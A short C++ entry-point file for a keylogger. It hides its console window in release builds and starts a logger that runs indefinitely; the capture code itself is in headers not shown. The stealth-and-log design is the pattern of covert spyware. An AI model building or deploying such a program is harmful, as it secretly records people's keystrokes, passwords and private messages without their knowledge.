// KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "StealthWindow.h"
#include "Logger.h"


int main()
{
#ifndef _DEBUG
	StealthWindow sw = StealthWindow();		// Hide the console window of the program
#endif

	Logger kl = Logger();
	kl.start();								// Start logging infinitly

    return 0;
}

